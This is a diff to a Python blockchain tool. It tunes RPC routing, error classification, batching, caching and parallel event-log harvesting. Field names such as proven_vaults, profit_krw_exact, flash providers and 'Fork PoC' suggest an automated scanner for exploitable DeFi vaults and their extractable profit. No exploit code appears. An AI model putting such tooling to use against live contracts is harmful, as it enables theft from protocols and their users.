@@ -372,6 +372,7 @@ def _checksum(addr: str) -> str:
     return _checksum_cached(a)
 
 
+@functools.lru_cache(maxsize=4096)
 def _is_non_precompile_addr(addr: Any) -> bool:
     """
     0x000..000 및 표준/L2 프리컴파일 대역(0x01~0x1ff, 0x400~0x4ff, 0x800~0x8ff)은 제외하되,
@@ -822,7 +823,7 @@ def abi_decode(types: Sequence[str], data: Any) -> Tuple[Any, ...]:
 
 # ── 크로스플랫폼 파일 락 · 부트 ID · 좀비 락 회수 · 원자적 JSON 입출력 ──
 @contextlib.contextmanager
-def _exclusive_file_lock(lock_path: Path, timeout_sec: float = 30.0) -> Iterator[None]:
+def _exclusive_file_lock(lock_path: Path, timeout_sec: float = 300.0) -> Iterator[None]:
     lock_path.parent.mkdir(parents=True, exist_ok=True)
     fh = open(lock_path, "a+b")
     deadline = time.monotonic() + max(0.5, timeout_sec)
@@ -1248,20 +1249,20 @@ class SQLiteStore:
             self._conn.executescript(self._DDL)
         with self._write_tx():
             for alter_sql in (
-                "ALTER TABLE audit_queue ADD COLUMN mode TEXT NOT NULL DEFAULT 'A'",
-                "ALTER TABLE audit_queue ADD COLUMN principle_summary TEXT NOT NULL DEFAULT ''",
-                "ALTER TABLE audit_queue ADD COLUMN needs_agent INTEGER NOT NULL DEFAULT 0",
-                "ALTER TABLE audit_queue ADD COLUMN sort_rank REAL NOT NULL DEFAULT 0.0",
-                "ALTER TABLE audit_queue ADD COLUMN tvl_usd_dec TEXT NOT NULL DEFAULT '0'",
-                "ALTER TABLE audit_queue ADD COLUMN sort_rank_dec TEXT NOT NULL DEFAULT '0'",
-                "ALTER TABLE audit_queue ADD COLUMN net_krw_exact TEXT NOT NULL DEFAULT '0'",
-                "ALTER TABLE audit_queue ADD COLUMN session_id TEXT NOT NULL DEFAULT ''",
-                "ALTER TABLE proven_vaults ADD COLUMN fully_exhausted INTEGER NOT NULL DEFAULT 1",
-                "ALTER TABLE proven_vaults ADD COLUMN net_krw_exact TEXT NOT NULL DEFAULT '0'",
-                "ALTER TABLE audit_sessions ADD COLUMN profit_krw_exact TEXT NOT NULL DEFAULT '0'",
-                "ALTER TABLE price_cache ADD COLUMN price_val_dec TEXT NOT NULL DEFAULT ''",
-                "ALTER TABLE token_valuation ADD COLUMN price_usd_dec TEXT NOT NULL DEFAULT ''",
-                "ALTER TABLE token_valuation ADD COLUMN dex_exit_depth_usd_dec TEXT NOT NULL DEFAULT ''",
+            "ALTER TABLE audit_queue ADD COLUMN mode TEXT NOT NULL DEFAULT 'A'",
+            "ALTER TABLE audit_queue ADD COLUMN principle_summary TEXT NOT NULL DEFAULT ''",
+            "ALTER TABLE audit_queue ADD COLUMN needs_agent INTEGER NOT NULL DEFAULT 0",
+            "ALTER TABLE audit_queue ADD COLUMN sort_rank REAL NOT NULL DEFAULT 0.0",
+            "ALTER TABLE audit_queue ADD COLUMN tvl_usd_dec TEXT NOT NULL DEFAULT '0'",
+            "ALTER TABLE audit_queue ADD COLUMN sort_rank_dec TEXT NOT NULL DEFAULT '0'",
+            "ALTER TABLE audit_queue ADD COLUMN net_krw_exact TEXT NOT NULL DEFAULT '0'",
+            "ALTER TABLE audit_queue ADD COLUMN session_id TEXT NOT NULL DEFAULT ''",
+            "ALTER TABLE proven_vaults ADD COLUMN fully_exhausted INTEGER NOT NULL DEFAULT 1",
+            "ALTER TABLE proven_vaults ADD COLUMN net_krw_exact TEXT NOT NULL DEFAULT '0'",
+            "ALTER TABLE audit_sessions ADD COLUMN profit_krw_exact TEXT NOT NULL DEFAULT '0'",
+            "ALTER TABLE price_cache ADD COLUMN price_val_dec TEXT NOT NULL DEFAULT ''",
+            "ALTER TABLE token_valuation ADD COLUMN price_usd_dec TEXT NOT NULL DEFAULT ''",
+            "ALTER TABLE token_valuation ADD COLUMN dex_exit_depth_usd_dec TEXT NOT NULL DEFAULT ''",
             ):
                 try:
                     self._conn.execute(alter_sql)
@@ -1290,14 +1291,14 @@ class SQLiteStore:
 
     @staticmethod
     def _run_with_busy_retry(op: Callable[[], Any]) -> None:
-        for attempt in range(6):
+        for attempt in range(100):
             try:
                 op()
                 return
             except sqlite3.OperationalError as exc:
-                if attempt == 5 or not any(k in str(exc).lower() for k in ("locked", "busy")):
+                if attempt == 99 or not any(k in str(exc).lower() for k in ("locked", "busy")):
                     raise
-                time.sleep(0.025 * (attempt + 1))
+                time.sleep(min(5.0, 0.05 * (attempt + 1)))
 
     @contextlib.contextmanager
     def _write_tx(self, *, immediate: bool = True) -> Iterator[sqlite3.Connection]:
@@ -1626,18 +1627,21 @@ class SQLiteStore:
             )
 
     def _latest_contract_code_rows(
-        self, cols_sql: str, chain_id: Optional[int] = None
+        self, cols_sql: str, chain_id: Optional[int] = None, extra_where: str = ""
     ) -> List[Tuple[int, str, sqlite3.Row]]:
+        where_parts: List[str] = []
+        params: List[Any] = []
+        if chain_id is not None and int(chain_id) > 0:
+            where_parts.append("chain_id=?")
+            params.append(int(chain_id))
+        if extra_where:
+            where_parts.append(f"({extra_where})")
+        where_sql = f" WHERE {' AND '.join(where_parts)}" if where_parts else ""
         with self._read_conn() as rc:
-            if chain_id is not None and int(chain_id) > 0:
-                rows = rc.execute(
-                    f"SELECT chain_id, address, {cols_sql} FROM contract_code WHERE chain_id=? ORDER BY audit_block DESC, rowid DESC",
-                    (int(chain_id),),
-                ).fetchall()
-            else:
-                rows = rc.execute(
-                    f"SELECT chain_id, address, {cols_sql} FROM contract_code ORDER BY audit_block DESC, rowid DESC"
-                ).fetchall()
+            rows = rc.execute(
+                f"SELECT chain_id, address, {cols_sql} FROM contract_code{where_sql} ORDER BY audit_block DESC, rowid DESC",
+                tuple(params),
+            ).fetchall()
         deduped: List[Tuple[int, str, sqlite3.Row]] = []
         seen: Set[Tuple[int, str]] = set()
         for r in rows:
@@ -1686,7 +1690,11 @@ class SQLiteStore:
         if not targets:
             return []
         out: List[Dict[str, Any]] = []
-        for cid, addr, r in self._latest_contract_code_rows("proxy_kind, impl_addrs_json", chain_id):
+        for cid, addr, r in self._latest_contract_code_rows(
+            "proxy_kind, impl_addrs_json",
+            chain_id,
+            extra_where="impl_addrs_json IS NOT NULL AND impl_addrs_json != '' AND impl_addrs_json != '[]'",
+        ):
             try:
                 impls = [_norm_addr(x) for x in json.loads(r["impl_addrs_json"] or "[]")]
             except Exception:
@@ -1775,12 +1783,6 @@ class SQLiteStore:
         raw_dec = row["price_val_dec"] if row["price_val_dec"] not in (None, "") else row["price_val"]
         return _to_dec(raw_dec), str(row["source"])
 
-    def get_price(self, price_key: str, max_age_sec: float = 3600.0) -> Optional[Tuple[float, str]]:
-        hit = self.get_price_dec(price_key, max_age_sec=max_age_sec)
-        if hit is None:
-            return None
-        return float(hit[0]), hit[1]
-
     def put_price(self, price_key: str, price_val: Union[Decimal, int, str, float], source: str) -> None:
         pv_dec = _to_dec(price_val)
         with self._write_tx():
@@ -1808,15 +1810,19 @@ class SQLiteStore:
         if not items:
             return
         now = time.time()
+        params: List[Tuple[str, str, float]] = []
+        for slug, meta_dict in items:
+            ns = _norm_slug(slug)
+            if not ns or not isinstance(meta_dict, dict):
+                continue
+            params.append((ns, json.dumps(meta_dict, ensure_ascii=False), now))
+        if not params:
+            return
         with self._write_tx():
-            for slug, meta_dict in items:
-                ns = _norm_slug(slug)
-                if not ns or not isinstance(meta_dict, dict):
-                    continue
-                self._conn.execute(
-                    "INSERT OR REPLACE INTO proto_meta(slug, meta_json, updated_at) VALUES(?,?,?)",
-                    (ns, json.dumps(meta_dict, ensure_ascii=False), now),
-                )
+            self._conn.executemany(
+                "INSERT OR REPLACE INTO proto_meta(slug, meta_json, updated_at) VALUES(?,?,?)",
+                params,
+            )
 
     @staticmethod
     def _coerce_chain_id(chain_id: Union[int, str]) -> int:
@@ -2883,7 +2889,7 @@ CHAIN_RPCS: Dict[str, List[str]] = {
     'eoraptor': ['https://rpc.eoraptor.org'],
     'esyncnetwork': ['https://rpc.esync.network'],
     'eteria': ['https://mainnet.eteria.io/v1'],
-    'ethereum': ['https://ethereum.drpc.org', 'https://rpc.mevblocker.io', 'https://rpc.mevblocker.io/fast', 'https://mainnet.gateway.tenderly.co', 'https://ethereum-rpc.blockreq.com/v1/rpc/public', 'https://eth.drpc.org', 'https://ethereum-rpc.publicnode.com'],
+    'ethereum': ['https://ethereum.drpc.org', 'https://rpc.mevblocker.io', 'https://rpc.mevblocker.io/fast', 'https://mainnet.gateway.tenderly.co', 'https://ethereum-rpc.blockreq.com/v1/rpc/public', 'https://eth.drpc.org', 'https://ethereum-rpc.publicnode.com', 'https://api.mycryptoapi.com/eth', 'https://cloudflare-eth.com'],
     'ethereumclassic': ['https://geth-at.etc-network.info', 'https://etc.etcdesktop.com'],
     'etherlink': ['https://node.mainnet.etherlink.com'],
     'ethiq': ['https://rpc.ethiq.network'],
@@ -3173,7 +3179,7 @@ CHAIN_RPCS: Dict[str, List[str]] = {
     'prom2': ['https://prom-rpc.eu-north-2.gateway.fm'],
     'proptech': ['https://mainnet.ptekcoin.com'],
     'pruv': ['https://rpc.pruv.network'],
-    'pulsechain': ['https://pulsechain-rpc.publicnode.com', 'https://pulsechain.publicnode.com', 'https://rpc-pulsechain.g4mm4.io', 'https://rpc.pulsechain.com'],
+    'pulsechain': ['https://rpc-pulsechain.g4mm4.io', 'https://rpc.pulsechain.com', 'https://pulsechain-rpc.publicnode.com', 'https://pulsechain.publicnode.com', 'https://rpc.pulsechain.net'],
     'pxa': ['https://rpc.pxachain.com'],
     'ql1': ['https://evm-rpc-ql1.foxxone.one'],
     'qore': ['https://evm.qore.host'],
@@ -3407,7 +3413,7 @@ KEYLESS_ARCHIVE_RPCS: Dict[str, List[str]] = {
     'energyweb': ['https://rpc.energyweb.org'],
     'eni': ['https://jp.eniacrpc.net', 'https://enirpc.com', 'https://jp.enirpc.com'],
     'eteria': ['https://mainnet.eteria.io/v1'],
-    'ethereum': ['https://ethereum.drpc.org', 'https://rpc.mevblocker.io', 'https://rpc.mevblocker.io/fast'],
+    'ethereum': ['https://ethereum.drpc.org', 'https://rpc.mevblocker.io', 'https://rpc.mevblocker.io/fast', 'https://api.mycryptoapi.com/eth', 'https://cloudflare-eth.com'],
     'ethereumclassic': ['https://geth-at.etc-network.info'],
     'etherlink': ['https://node.mainnet.etherlink.com'],
     'fantom': ['https://fantom.drpc.org'],
@@ -3471,7 +3477,7 @@ KEYLESS_ARCHIVE_RPCS: Dict[str, List[str]] = {
     'plume': ['https://rpc.plume.org'],
     'polygon': ['https://polygon.gateway.tenderly.co', 'https://rpc-mainnet.matic.quiknode.pro', 'https://polygon.drpc.org'],
     'polygonzkevm': ['https://zkevm-rpc.com', 'https://polygon-zkevm.drpc.org'],
-    'pulsechain': ['https://rpc-pulsechain.g4mm4.io', 'https://rpc.pulsechain.com'],
+    'pulsechain': ['https://rpc-pulsechain.g4mm4.io', 'https://rpc.pulsechain.com', 'https://rpc.pulsechain.net'],
     'qprotocol': ['https://rpc.q.org'],
     'quai': ['https://rpc.quai.network/cyprus1'],
     'rei': ['https://rpc.rei.network'],
@@ -3771,20 +3777,22 @@ FLASH_PROVIDERS: Dict[str, List[Dict[str, Any]]] = {
 }
 
 _BATCH_CAP_BY_HOST: Tuple[Tuple[str, int], ...] = (
-    ("drpc.org", 1),
-    ("1rpc.io", 5),
-    ("tenderly.co", 10),
-    ("optimism.io", 10),
-    ("quiknode.pro", 20),
-    ("tatum.io", 25),
-    ("avax.network", 25),
-    ("base.org", 25),
-    ("blockmachine.io", 50),
-    ("nodereal.io", 50),
-    ("binance.org", 100),
-    ("arbitrum.io", 100),
-    ("ankr.com", 100),
-    ("publicnode.com", 50),
+    ("drpc.org", 100),
+    ("1rpc.io", 100),
+    ("tenderly.co", 50),
+    ("optimism.io", 50),
+    ("quiknode.pro", 100),
+    ("pulsechain.com", 100),
+    ("rsk.co", 100),
+    ("tatum.io", 100),
+    ("avax.network", 100),
+    ("base.org", 100),
+    ("blockmachine.io", 200),
+    ("nodereal.io", 200),
+    ("binance.org", 500),
+    ("arbitrum.io", 500),
+    ("ankr.com", 500),
+    ("publicnode.com", 200),
 )
 
 
@@ -3830,18 +3838,56 @@ _SHRINK_ERR_MARKERS: Tuple[str, ...] = (
     "range is too large",
 )
 
-_QUOTA_ERR_MARKERS: Tuple[str, ...] = (
+_AUTH_DENIED_MARKERS: Tuple[str, ...] = (
     "401",
-    "402",
     "403",
+    "access denied",
+    "rpc endpoint key",
+    "unauthorized",
+    "forbidden",
+    "invalid api key",
+    "api key",
+)
+
+_QUOTA_ERR_MARKERS: Tuple[str, ...] = (
+    "402",
     "429",
     "rate limit",
     "max rate",
     "quota",
-    "unauthorized",
-    "forbidden",
-    "api key",
     " capacity ",
+)
+
+_DEAD_ENDPOINT_MARKERS: Tuple[str, ...] = (
+    *_AUTH_DENIED_MARKERS,
+    "http 404",
+    "http 410",
+    "404:",
+    "410:",
+    "not found",
+    "unknown chain",
+    "unsupported chain",
+)
+
+_TIMEOUT_ERR_MARKERS: Tuple[str, ...] = (
+    "timed out",
+    "timeout",
+    "read operation timed out",
+    "incomplete read",
+    "connection reset",
+    "remotedisconnected",
+    "remote end closed",
+    "unexpected eof",
+    "eof occurred",
+    "http 502",
+    "http 503",
+    "http 504",
+    "bad gateway",
+    "gateway timeout",
+    "service unavailable",
+    "connection refused",
+    "connect call failed",
+    "handshake",
 )
 
 
@@ -3901,7 +3947,7 @@ def _default_batch_cap_for_url(url: str) -> int:
     for suffix, cap in _BATCH_CAP_BY_HOST:
         if host.endswith(suffix):
             return cap
-    return 25
+    return 100
 
 
 def _read_body_deadlined(resp: Any, timeout_sec: float, max_bytes: int = 16 * 1024 * 1024) -> bytes:
@@ -3921,6 +3967,15 @@ def _read_body_deadlined(resp: Any, timeout_sec: float, max_bytes: int = 16 * 10
     return b"".join(chunks)
 
 
+def _text_has_any_marker(text: Any, markers: Sequence[str]) -> bool:
+    tl = str(text or "").lower()
+    return any(m in tl for m in markers)
+
+
+def _is_auth_denied_rpc_error(exc_or_err: Any) -> bool:
+    return _text_has_any_marker(exc_or_err, _AUTH_DENIED_MARKERS)
+
+
 def _classify_rpc_error(exc_or_err: Any) -> str:
     txt = str(exc_or_err or "").lower()
     if ("reorg" in txt or "block reverted" in txt) and "execution reverted" not in txt:
@@ -3929,10 +3984,16 @@ def _classify_rpc_error(exc_or_err: Any) -> str:
         return "revert"
     if "wrong_chain" in txt or "chainid mismatch" in txt:
         return "wrong_chain"
-    if any(m in txt for m in _SHRINK_ERR_MARKERS):
-        return "shrink"
+    if isinstance(exc_or_err, _DeterministicHTTPClientError) and getattr(exc_or_err, "status", 0) in (401, 403, 404, 410):
+        return "auth_dead"
+    if any(m in txt for m in _DEAD_ENDPOINT_MARKERS) and "header not found" not in txt and "block not found" not in txt and "missing trie node" not in txt:
+        return "auth_dead"
     if any(m in txt for m in _QUOTA_ERR_MARKERS):
         return "quota"
+    if any(m in txt for m in _SHRINK_ERR_MARKERS):
+        return "shrink"
+    if isinstance(exc_or_err, TimeoutError) or any(m in txt for m in _TIMEOUT_ERR_MARKERS):
+        return "timeout"
     return "gap"
 
 
@@ -3966,6 +4027,8 @@ class RPCRouter:
         self._last_shared_sync_at: float = 0.0
         self._verified_chain_urls: Set[Tuple[int, str]] = set()
         self._no_multicall_chains: Set[str] = set()
+        self._live_log_max_span_by_chain: Dict[str, int] = {}
+        self._mc3_cache: Dict[Tuple[str, int, bytes], List[Tuple[bool, bytes]]] = {}
         self._bm_cursor: int = 0
         self._ssl_ctx = ssl.create_default_context()
         self._sync_shared_endpoints_if_due(force=True)
@@ -3995,6 +4058,9 @@ class RPCRouter:
                         self._demote_until[u] = max(self._demote_until.get(u, 0.0), du)
                     bcap = int(row.get("batch_cap") or 0)
                     if bcap > 0 and u not in self._batch_caps:
+                        def_cap = _default_batch_cap_for_url(u)
+                        if du <= now and bcap < min(12, def_cap) and _is_live_real_router(self):
+                            bcap = min(def_cap, 25)
                         self._batch_caps[u] = bcap
                     rtt = float(row.get("rtt_ms") or 0.0)
                     if 0.0 < rtt < 60000.0 and u not in self._rtt_ms:
@@ -4154,7 +4220,8 @@ class RPCRouter:
                         keyed_urls.append(f"{stem}/v1/rpc/{bk}")
         arch_set = set(arch_urls) | set(keyed_urls)
         if need_archive:
-            ordered = list(dict.fromkeys(arch_urls + keyed_urls + base_urls))
+            # Fork PoC needs reliable archive at pinned block: keyed ANKR/BlockReq/Nodereal before keyless.
+            ordered = list(dict.fromkeys((keyed_urls + arch_urls + base_urls) if for_forge else (arch_urls + keyed_urls + base_urls)))
         else:
             ordered = list(dict.fromkeys(base_urls + keyed_urls))
         if not ordered:
@@ -4236,7 +4303,8 @@ class RPCRouter:
             self._record_failure(url, "gap", cid=expected_cid)
             return False
         except Exception as exc:
-            self._record_failure(url, _classify_rpc_error(exc), cid=expected_cid)
+            kind_v = "auth_dead" if _is_auth_denied_rpc_error(exc) else _classify_rpc_error(exc)
+            self._record_failure(url, kind_v, cid=expected_cid)
             return False
 
     def batch_cap_for(self, url: str) -> int:
@@ -4277,11 +4345,21 @@ class RPCRouter:
         now = time.time()
         force_save = False
         with self._lock:
-            if kind == "wrong_chain" and cid > 0:
+            if kind == "auth_dead":
+                if cid > 0:
+                    self._quarantine_until[(cid, url)] = now + self._QUARANTINE_TTL_SEC
+                self._demote_until[url] = now + self._QUARANTINE_TTL_SEC
+                self._cool_until[url] = now + self._QUARANTINE_TTL_SEC
+                force_save = True
+            elif kind == "wrong_chain" and cid > 0:
                 self._quarantine_until[(cid, url)] = now + self._QUARANTINE_TTL_SEC
                 force_save = True
             elif kind == "quota":
                 self._demote_until[url] = now + 1800.0
+                self._cool_until[url] = now + 60.0
+                force_save = True
+            elif kind == "timeout":
+                self._demote_until[url] = now + 600.0
                 self._cool_until[url] = now + 60.0
                 force_save = True
             elif kind == "shrink":
@@ -4589,6 +4667,11 @@ class RPCRouter:
                 raise RuntimeError(f"All RPC calls failed on {c}: {last_exc}") from last_exc
             return results
         urls = self.candidate_urls(c, need_archive=need_archive or (block_pin is not None and block_pin > 0))
+        if len(missing_indices) >= 4 and len(urls) > 1 and _is_live_real_router(self):
+            urls = sorted(
+                urls,
+                key=lambda u: 0 if self.batch_cap_for(u) >= 20 else (1 if self.batch_cap_for(u) >= 8 else 2),
+            )
         if not urls:
             failed_indices.update(missing_indices)
             self._set_tls_batch_failures(failed_indices, batch_errors)
@@ -4692,6 +4775,13 @@ class RPCRouter:
                     ok_rpc_count += len(chunk_idxs) - len(unresolved_in_chunk)
                     raise RuntimeError(str(non_revert_err))
                 self._record_success(url, (time.perf_counter() - t0) * 1000.0, cid=cid)
+                if len(chunk_idxs) >= cap and cap > 1:
+                    def_cap_ok = _default_batch_cap_for_url(url)
+                    if cap < def_cap_ok:
+                        with self._lock:
+                            cur_c = self._batch_caps.get(url, cap)
+                            if cur_c < def_cap_ok:
+                                self._batch_caps[url] = min(def_cap_ok, max(cur_c + 4, int(cur_c * 1.5)))
                 ok_rpc_count += len(chunk_idxs)
                 del pending[:len(chunk_idxs)]
             except Exception as exc:
@@ -4766,10 +4856,34 @@ class RPCRouter:
             return []
         c = _norm_chain(chain)
         btag = hex(int(block_pin)) if block_pin > 0 else "latest"
+        can_cache_mc3 = (
+            int(block_pin or 0) > 0
+            and type(self).call is RPCRouter.call
+            and "call" not in self.__dict__
+            and _is_live_real_router(self)
+        )
+        mc3_key: Optional[Tuple[str, int, bytes]] = None
+        if can_cache_mc3:
+            h_mc = hashlib.sha256()
+            for t_c, cd_c in calls:
+                h_mc.update(_norm_addr(t_c).encode("ascii", errors="ignore"))
+                h_mc.update(b":")
+                h_mc.update(bytes(cd_c))
+                h_mc.update(b"|")
+            mc3_key = (c, int(block_pin), h_mc.digest())
+            with self._lock:
+                cached_mc = self._mc3_cache.get(mc3_key)
+            if cached_mc is not None and len(cached_mc) == len(calls):
+                return list(cached_mc)
         if c in self._no_multicall_chains:
             fb_res = self._batch_eth_call_fallback(c, calls, btag, block_pin)
             if tls is not None:
                 tls.last_multicall_transport_failed = bool(getattr(tls, "last_fallback_transport_failed", False))
+            if mc3_key is not None and not (tls and tls.last_multicall_transport_failed) and len(fb_res) == len(calls):
+                with self._lock:
+                    if len(self._mc3_cache) >= 2048:
+                        self._mc3_cache.clear()
+                    self._mc3_cache[mc3_key] = list(fb_res)
             return fb_res
         out: List[Tuple[bool, bytes]] = []
         any_transport_failed = False
@@ -4831,6 +4945,11 @@ class RPCRouter:
                 _append_fallback(sub)
         if tls is not None:
             tls.last_multicall_transport_failed = any_transport_failed
+        if mc3_key is not None and not any_transport_failed and len(out) == len(calls):
+            with self._lock:
+                if len(self._mc3_cache) >= 2048:
+                    self._mc3_cache.clear()
+                self._mc3_cache[mc3_key] = list(out)
         return out
 
 
@@ -5842,14 +5961,14 @@ def _build_weighted_gram_dict(grams: Set[bytes]) -> Tuple[Dict[bytes, float], fl
 
 
 def _weighted_containment_from_hits(
-    hit_grams: Set[bytes],
+    hit_grams: Union[Set[bytes], Sequence[bytes]],
     seed_wmap: Mapping[bytes, float],
     seed_wtot: float,
 ) -> float:
     if seed_wtot <= 0.0 or not hit_grams or not seed_wmap:
         return 0.0
     acc = 0.0
-    for g in sorted(hit_grams):
+    for g in (hit_grams if isinstance(hit_grams, (list, tuple)) else sorted(hit_grams)):
         w = seed_wmap.get(g)
         if w is not None:
             acc += w
@@ -6892,11 +7011,15 @@ def _score_cand_clean_against_seed_pool(
     if not c_hit and not aux_hit:
         return None, 0.0
 
+    # Pre-sort shared hit sets once: _weighted_containment would re-sort them per seed (O(S*H log H)).
+    c_hit_sorted: List[bytes] = sorted(c_hit)
+    aux_hit_sorted: List[bytes] = sorted(aux_hit)
+
     best_ps: Optional[Dict[str, Any]] = None
     best_sc = 0.0
 
     for ps in compat_full:
-        sc = _eval_single_seed_multitier_score(ps, c_hit, aux_hit, cand_non_bp_sels, min_threshold, best_sc, locus_only=False)
+        sc = _eval_single_seed_multitier_score(ps, c_hit_sorted, aux_hit_sorted, cand_non_bp_sels, min_threshold, best_sc, locus_only=False)
         if sc > best_sc:
             best_sc = sc
             best_ps = ps
@@ -6906,7 +7029,7 @@ def _score_cand_clean_against_seed_pool(
     for ps in compat_locus_only:
         if 0.92 <= best_sc:
             break
-        sc_loc = _eval_single_seed_multitier_score(ps, c_hit, aux_hit, cand_non_bp_sels, min_threshold, best_sc, locus_only=True)
+        sc_loc = _eval_single_seed_multitier_score(ps, c_hit_sorted, aux_hit_sorted, cand_non_bp_sels, min_threshold, best_sc, locus_only=True)
         if sc_loc > best_sc:
             best_sc = sc_loc
             best_ps = ps
@@ -6915,8 +7038,8 @@ def _score_cand_clean_against_seed_pool(
 
 def _eval_single_seed_multitier_score(
     ps: Mapping[str, Any],
-    c_hit: Set[bytes],
-    aux_hit: Set[bytes],
+    c_hit: Union[Set[bytes], Sequence[bytes]],
+    aux_hit: Union[Set[bytes], Sequence[bytes]],
     cand_non_bp_sels: Set[str],
     min_threshold: float,
     cur_best: float,
@@ -6927,6 +7050,7 @@ def _eval_single_seed_multitier_score(
     ssg_w_val = 0.0
     shared_sels = bool((ps.get("non_bp_sels") or set()) & cand_non_bp_sels)
     ssg_grams_s: Set[bytes] = ps.get("ssg_grams") or set()
+    aux_hit_set: Set[bytes] = aux_hit if isinstance(aux_hit, set) else set(aux_hit)
     if not locus_only:
         c_wtot = float(ps.get("clean_wtot") or 0.0)
         if c_wtot > 0.0 and c_hit:
@@ -6945,7 +7069,7 @@ def _eval_single_seed_multitier_score(
                 best_local = rel_w
 
         if len(ssg_grams_s) >= 6 and aux_hit:
-            ssg_inter = aux_hit & ssg_grams_s
+            ssg_inter = aux_hit_set & ssg_grams_s
             ssg_w_val = _weighted_containment_from_hits(ssg_inter, ps["ssg_wmap"], float(ps.get("ssg_wtot") or 1.0))
             ordered_hits = sum(1 for g in ssg_inter if g[:2] in (b"\xfd3", b"\xfd4", b"\xfdE"))
             if ordered_hits >= 4 or (shared_sels and ordered_hits >= 2):
@@ -6954,7 +7078,7 @@ def _eval_single_seed_multitier_score(
                     best_local = scaled_ssg
         eff_grams_s: Set[bytes] = ps.get("effect_grams") or set()
         if len(eff_grams_s) >= 6 and aux_hit:
-            eff_inter = aux_hit & eff_grams_s
+            eff_inter = aux_hit_set & eff_grams_s
             if len(eff_inter) >= 5 or (shared_sels and len(eff_inter) >= 3):
                 eff_w_val = _weighted_containment_from_hits(eff_inter, ps["effect_wmap"], float(ps.get("effect_wtot") or 1.0))
                 if eff_w_val >= 0.42:
@@ -6975,7 +7099,7 @@ def _eval_single_seed_multitier_score(
                     best_local = cand_lsc
             ls_grams: Set[bytes] = loc["ssg_grams"]
             if len(ls_grams) >= 5:
-                ls_inter = aux_hit & ls_grams
+                ls_inter = aux_hit_set & ls_grams
                 ls_ord = sum(1 for g in ls_inter if g[:2] in (b"\xfd3", b"\xfd4", b"\xfdE"))
                 if ls_ord >= 4:
                     ls_w = _weighted_containment_from_hits(ls_inter, loc["ssg_wmap"], float(loc["ssg_wtot"]))
@@ -9858,6 +9982,11 @@ def _harvest_logs_bisect(
         if from_block >= to_block or max_depth == 0:
             return set()
         mid = (from_block + to_block) // 2
+        if max_depth >= 1 and _is_live_real_router(router):
+            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex_lb:
+                fut_l = ex_lb.submit(_harvest_logs_bisect, router, chain, seeds, from_block, mid, max_depth - 1)
+                fut_r = ex_lb.submit(_harvest_logs_bisect, router, chain, seeds, mid + 1, to_block, max_depth - 1)
+                return fut_l.result() | fut_r.result()
         left = _harvest_logs_bisect(router, chain, seeds, from_block, mid, max_depth - 1)
         right = _harvest_logs_bisect(router, chain, seeds, mid + 1, to_block, max_depth - 1)
         return left | right
@@ -9871,22 +10000,31 @@ def _harvest_token_logs_bisect(
     to_block: int,
     max_depth: int = 3,
     out_spenders: Optional[Set[str]] = None,
+    *,
+    _filter_indices: Tuple[int, ...] = (0, 1, 2),
+    _spenders_lock: Optional[threading.Lock] = None,
 ) -> Tuple[Set[str], Set[str]]:
     """Transfer/Approval 이벤트로부터 프로토콜 금고가 보유하거나 승인받은/부여한 커스텀 ERC-20 및 오너·스펜더 주소 수집."""
     tokens: Set[str] = set()
     owners: Set[str] = set()
-    if not holders or from_block > to_block or max_depth < 0:
+    if not holders or from_block > to_block or max_depth < 0 or not _filter_indices:
         return tokens, owners
     holder_set = {nh for h in list(holders)[:12] if (nh := _norm_addr(h))}
     padded = ["0x" + ("0" * 24) + nh[2:] for h in list(holders)[:12] if (nh := _norm_addr(h))]
     if not padded:
         return tokens, owners
-    need_bisect = False
-    for topics_filter in (
+    all_filters: Tuple[List[Any], ...] = (
         [[TRANSFER_TOPIC0, APPROVAL_TOPIC0], None, padded],
         [TRANSFER_TOPIC0, padded],
         [APPROVAL_TOPIC0, padded],
-    ):
+    )
+    sp_lock = _spenders_lock or threading.Lock()
+    is_live = _is_live_real_router(router)
+
+    def _run_filter(f_idx: int) -> Tuple[int, bool, Set[str], Set[str], Set[str]]:
+        f_toks: Set[str] = set()
+        f_owns: Set[str] = set()
+        f_sps: Set[str] = set()
         try:
             logs = router.call(
                 chain,
@@ -9894,7 +10032,7 @@ def _harvest_token_logs_bisect(
                 [{
                     "fromBlock": hex(from_block),
                     "toBlock": hex(to_block),
-                    "topics": topics_filter,
+                    "topics": all_filters[f_idx],
                 }],
                 block_pin=(int(to_block) if int(to_block) > 0 else None),
                 timeout=8.0,
@@ -9904,7 +10042,7 @@ def _harvest_token_logs_bisect(
                     continue
                 em = _norm_addr(lg.get("address"))
                 if _is_non_precompile_addr(em):
-                    tokens.add(em)
+                    f_toks.add(em)
                 t_list = lg.get("topics") or []
                 if len(t_list) >= 3 and str(t_list[0]).lower() == APPROVAL_TOPIC0.lower():
                     t1 = str(t_list[1] or "")
@@ -9912,23 +10050,58 @@ def _harvest_token_logs_bisect(
                     ow = _norm_addr("0x" + t1[26:]) if len(t1) == 66 else ""
                     sp = _norm_addr("0x" + t2[26:]) if len(t2) == 66 else ""
                     if _is_non_precompile_addr(ow):
-                        owners.add(ow)
-                    if (
-                        out_spenders is not None
-                        and _is_non_precompile_addr(sp)
-                        and sp not in holder_set
-                    ):
-                        out_spenders.add(sp)
+                        f_owns.add(ow)
+                    if out_spenders is not None and _is_non_precompile_addr(sp) and sp not in holder_set:
+                        f_sps.add(sp)
+            return f_idx, True, f_toks, f_owns, f_sps
         except Exception:
-            need_bisect = True
-    if need_bisect and from_block < to_block and max_depth > 0:
+            return f_idx, False, f_toks, f_owns, f_sps
+
+    if is_live and len(_filter_indices) >= 2:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=len(_filter_indices)) as ex_tf:
+            filter_results = list(ex_tf.map(_run_filter, _filter_indices))
+    else:
+        filter_results = [_run_filter(fi) for fi in _filter_indices]
+
+    failed_filters: List[int] = []
+    collected_spenders: Set[str] = set()
+    for f_idx, ok_f, f_toks, f_owns, f_sps in filter_results:
+        if ok_f:
+            tokens |= f_toks
+            owners |= f_owns
+            collected_spenders |= f_sps
+        else:
+            failed_filters.append(f_idx)
+    if out_spenders is not None and collected_spenders:
+        with sp_lock:
+            out_spenders |= collected_spenders
+
+    if failed_filters and from_block < to_block and max_depth > 0:
         mid = (from_block + to_block) // 2
-        lt_l, lo_l = _harvest_token_logs_bisect(
-            router, chain, holders, from_block, mid, max_depth - 1, out_spenders=out_spenders
-        )
-        lt_r, lo_r = _harvest_token_logs_bisect(
-            router, chain, holders, mid + 1, to_block, max_depth - 1, out_spenders=out_spenders
-        )
+        fail_tup = tuple(failed_filters)
+        if is_live:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex_tb:
